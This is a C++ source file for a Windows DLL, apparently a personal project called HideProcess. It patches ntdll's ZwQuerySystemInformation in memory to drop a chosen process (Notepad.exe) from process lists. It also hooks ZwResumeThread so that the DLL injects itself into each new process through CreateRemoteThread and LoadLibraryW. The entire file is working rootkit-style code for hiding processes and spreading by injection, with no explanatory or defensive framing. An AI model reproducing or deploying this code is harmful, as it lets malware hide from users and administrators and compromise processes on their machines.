#include <windows.h>
#include <ntstatus.h>
#include <winternl.h>



#include <string>
#include <vector>
#include <tchar.h>




#pragma comment(linker,"/SECTION:.SHARED,RWS")
#pragma data_seg(".SHARE")
TCHAR g_szProcName[256] = {};
#pragma data_seg()
extern "C" {
	__declspec(dllexport) void setProcName(LPCTSTR szProcName)
	{
		_tcscpy_s(g_szProcName, szProcName);
	}
}



//PZwQuerySystemInformation
//00007FFBF7E50A70  mov         r10, rcx
//00007FFBF7E50A73  mov         eax, 36h
//00007FFBF7E50A78  test        byte ptr[7FFE0308h], 1
//00007FFBF7E50A80  jne         00007FFBF7E50A85
//00007FFBF7E50A82  syscall
//00007FFBF7E50A84  ret




BYTE orgBytesA[14];
BYTE orgBytesB[14];

typedef NTSTATUS(WINAPI* PZwQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);



typedef NTSTATUS(WINAPI* PZwResumeThread)(
	HANDLE threadHandle,
	PULONG SuspendCount
	);


typedef struct _THREAD_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	PVOID TebBaseAddress;
	CLIENT_ID ClientId;
	KAFFINITY AffinityMask;
	KPRIORITY Priority;
	KPRIORITY BasePriority;
} THREAD_BASIC_INFORMATION;



FARPROC getProc(std::string moduleName, std::string processName)
{
	return GetProcAddress(GetModuleHandleA(moduleName.c_str()), processName.c_str());
}


bool hookByCode(std::string moduleName, std::string processName, PROC pFuncNew, PBYTE orgBytes)
{
	BYTE jmpcode[14] = { 0xff,0x25,0x00,0x00,0x00,0x00 };
	FARPROC orgFunc = getProc(moduleName, processName);
	PBYTE pOrgFunc = reinterpret_cast<PBYTE>(orgFunc);
	if (pOrgFunc[0] == 0xff && pOrgFunc[1] == 0x25)
	{
		return false;
	}
	DWORD dwOldProtect;

	VirtualProtect(pOrgFunc, 14, PAGE_EXECUTE_READWRITE, &dwOldProtect);


	//保存原始代码
	memcpy(orgBytes, pOrgFunc, 14);


	//8BYTE跳转为绝对地址
	DWORD64 targetAddr = reinterpret_cast<DWORD64>(pFuncNew);

	memcpy(&jmpcode[6], &targetAddr, 8);
	memcpy(pOrgFunc, jmpcode, 14);

	VirtualProtect(pOrgFunc, 14, dwOldProtect, &dwOldProtect);

	return true;
}

bool unhookByCode(std::string moduleName, std::string processName, PBYTE orgBytes)
{
	FARPROC orgFunc = getProc(moduleName, processName);
	PBYTE pOrgFunc = reinterpret_cast<PBYTE>(orgFunc);

	if (!(pOrgFunc[0] == 0xff && pOrgFunc[1] == 0x25))
	{
		return false;
	}

	DWORD dwOldProtect;

	VirtualProtect(pOrgFunc, 14, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	memcpy(pOrgFunc, orgBytes, 14);


	VirtualProtect(pOrgFunc, 14, dwOldProtect, &dwOldProtect);

	return true;
}

NTSTATUS myZwQuerySystemInformation(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	unhookByCode("ntdll.dll", "NtQuerySystemInformation", &orgBytesA[0]);
	PZwQuerySystemInformation pZwQuerySystemInformation = reinterpret_cast<PZwQuerySystemInformation>(getProc("ntdll.dll", "ZwQuerySystemInformation"));
	NTSTATUS status = pZwQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (status != STATUS_SUCCESS)
	{
		goto end;
	}
	if (SystemInformationClass == 5 && g_szProcName[0] != '\0')
	{
		PSYSTEM_PROCESS_INFORMATION pInfo = static_cast<PSYSTEM_PROCESS_INFORMATION>(SystemInformation);
		PSYSTEM_PROCESS_INFORMATION pNextInfo = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<PBYTE>(pInfo) + pInfo->NextEntryOffset);
		while (pNextInfo->NextEntryOffset)
		{
			if (!_tcsicmp(pNextInfo->ImageName.Buffer, g_szProcName))
			{
				pInfo->NextEntryOffset += pNextInfo->NextEntryOffset;
			}
			pInfo = pNextInfo;
			pNextInfo = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<PBYTE>(pInfo) + pInfo->NextEntryOffset);
		}
	}



end:
	hookByCode("ntdll.dll", "ZwQuerySystemInformation", reinterpret_cast<PROC>(myZwQuerySystemInformation), &orgBytesA[0]);
	return status;

}

int inject(DWORD dwPID, LPCTSTR szDllPath) {
	HANDLE hProcess = 0, hThread = 0;
	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) { // 取得对应 PID 句柄
		_tprintf(_T("Open process %d failed\n"), dwPID);
		return FALSE;
	}

	DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);

	LPVOID pBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
	if (pBuf == NULL) {
		//_tprintf(_T("Memory allocation failed in process %d\n"), dwPID);
		CloseHandle(hProcess);
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, NULL)) {
		//_tprintf(_T("WriteProcessMemory failed in process %d\n"), dwPID);
		VirtualFreeEx(hProcess, pBuf, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return FALSE;
	}

	HMODULE hKernel32 = GetModuleHandle(_T("kernel32.dll"));
	if (hKernel32 == NULL) {
		//_tprintf(_T("GetModuleHandle failed\n"));
		VirtualFreeEx(hProcess, pBuf, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return FALSE;
	}

	LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	if (pThreadProc == NULL) {
		//_tprintf(_T("GetProcAddress failed\n"));
		VirtualFreeEx(hProcess, pBuf, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return FALSE;
	}

	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pBuf, 0, NULL);
	if (hThread == NULL) {
		//_tprintf(_T("CreateRemoteThread failed in process %d\n"), dwPID);
		VirtualFreeEx(hProcess, pBuf, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return FALSE;
	}

	WaitForSingleObject(hThread, 1500);

	CloseHandle(hThread);
	VirtualFreeEx(hProcess, pBuf, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	//_tprintf(_T("DLL injected successfully into process %d\n"), dwPID);
	return TRUE;
}

NTSTATUS myZwResumeThread(
	HANDLE threadHandle,
	PULONG SuspendCount)
{
	typedef NTSTATUS(NTAPI* ZwQueryInformationThread_t)(
		HANDLE ThreadHandle,
		DWORD ThreadInformationClass,
		PVOID ThreadInformation,
		ULONG ThreadInformationLength,
		PULONG ReturnLength OPTIONAL
		);
	THREAD_BASIC_INFORMATION tbi;
	FARPROC pqit = getProc("ntdll.dll", "ZwQueryInformationThread");
	NTSTATUS statusThread = reinterpret_cast<ZwQueryInformationThread_t>(pqit)(threadHandle, 0, &tbi, sizeof(tbi), NULL);
	DWORD dwPid = reinterpret_cast<DWORD>(tbi.ClientId.UniqueProcess);
	DWORD dwPrevPid = 0;
	if (dwPid != GetCurrentProcessId() && dwPid != dwPrevPid)
	{
		dwPrevPid = dwPid;
		inject(dwPid, L"C:\\Users\\a2879\\source\\repos\\HideProcess\\x64\\Debug\\HideProcess.dll");
	}

	unhookByCode("ntdll.dll", "ZwResumeThread", &orgBytesB[0]);
	PZwResumeThread pZwResumeThread = reinterpret_cast<PZwResumeThread>(getProc("ntdll.dll", "ZwResumeThread"));
	NTSTATUS status = pZwResumeThread(threadHandle, SuspendCount);

	hookByCode("ntdll.dll", "ZwResumeThread", reinterpret_cast<PROC>(myZwResumeThread), &orgBytesB[0]);
	return status;

}




BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	setProcName(L"Notepad.exe");
	std::string curProc(MAX_PATH, '\0');
	char* p = nullptr;
	GetModuleFileNameA(nullptr, &curProc[0], curProc.size());
	p = const_cast<char*>(strrchr(curProc.c_str(), '\\'));
	if (p != nullptr && !_stricmp(p + 1, "DLL_inject.exe"))
	{
		return true;
	}
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		/*CreateThread(nullptr, 0, startHide, nullptr, 0, nullptr);*/
		hookByCode("ntdll.dll", "ZwQuerySystemInformation", reinterpret_cast<PROC>(myZwQuerySystemInformation), &orgBytesA[0]);
		hookByCode("ntdll.dll", "ZwResumeThread", reinterpret_cast<PROC>(myZwResumeThread), &orgBytesB[0]);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

